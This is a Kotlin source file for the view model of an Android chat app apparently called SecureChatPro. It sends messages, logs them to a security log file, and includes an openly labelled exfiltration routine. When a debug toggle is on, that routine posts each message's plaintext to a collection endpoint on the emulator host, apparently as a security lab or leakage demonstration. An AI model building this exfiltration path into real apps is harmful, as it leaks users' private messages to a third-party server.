/*******************************************************************************
 * Copyright (c) 2025 Alfie Ardinata
 *
 * The contents of this file are subject to the Common Development
 * and Distribution License ("CDDL") Version 1.1 (the "License").
 * You may not use this file except in compliance with the License.
 *
 * You can obtain a copy of the License at
 * http://www.opensource.org/licenses/CDDL-1.1
 *
 * Software distributed under the License is distributed on an "AS IS"
 * basis, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express
 * or implied. See the License for the specific language governing
 * permissions and limitations under the License.
 ******************************************************************************/

package org.dpdns.securechatpro.viewmodel

import android.app.Application
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateListOf
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.setValue
import androidx.compose.runtime.snapshots.SnapshotStateList
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.dpdns.securechatpro.engine.ChatEngine
import org.dpdns.securechatpro.engine.SendResult
import org.dpdns.securechatpro.model.ChatMessage
import org.dpdns.securechatpro.util.LogUtil
import java.net.HttpURLConnection
import java.net.URL

class ChatViewModel(app: Application) : AndroidViewModel(app) {
    companion object {
        private const val EXFIL_URL: String = "http://10.0.2.2:5000/upload"
    }

    private val engine = ChatEngine(app)

    // UI state
    private val _messages = mutableStateListOf<ChatMessage>()
    val messages: SnapshotStateList<ChatMessage> get() = _messages

    var input: String by mutableStateOf("")
    var exfilToggle: Boolean by mutableStateOf(
        runCatching {
            val clazz = Class.forName("${app.packageName}.BuildConfig")
            clazz.getField("DEBUG_EXFIL").getBoolean(null)
        }.getOrDefault(false)
    )
        private set

    fun toggleExfil() { exfilToggle = !exfilToggle }

    fun onSend(): SendResult {
        val sanitized = input.trim()
        if (sanitized.isBlank()) {
            return SendResult.Error("Pesan kosong")
        }
        when (val result = engine.sendMessage(sanitized)) {
            is SendResult.Error -> return result
            is SendResult.Success -> {
                val now = System.currentTimeMillis()
                _messages.add(
                    ChatMessage(
                        id = now,
                        text = sanitized,
                        isOutgoing = true,
                        timestamp = now
                    )
                )
                val infoText = "Tersimpan: security_log.txt\nPath: ${result.logPath}"
                _messages.add(
                    ChatMessage(
                        id = now + 1,
                        text = infoText,
                        isOutgoing = false,
                        timestamp = now
                    )
                )
                if (exfilToggle) {
                    exfiltrate(sanitized)
                }
                input = ""
                return result
            }
        }
    }

    private fun exfiltrate(plaintext: String) {
        val ctx = getApplication<Application>()
        viewModelScope.launch(Dispatchers.IO) {
            try {
                val url = URL(EXFIL_URL)
                val conn = (url.openConnection() as HttpURLConnection).apply {
                    requestMethod = "POST"
                    doOutput = true
                    setRequestProperty("Content-Type", "text/plain; charset=utf-8")
                    connectTimeout = 3000
                    readTimeout = 3000
                }
                conn.outputStream.use { os ->
                    os.write(plaintext.toByteArray(Charsets.UTF_8))
                }
                val code = conn.responseCode
                LogUtil.appendLog(ctx, "EXFIL", "Sent plaintext (code=$code)")
            } catch (t: Throwable) {
                LogUtil.appendLog(ctx, "ERROR", "Exfil failed: ${t.message}")
            }
        }
    }
}
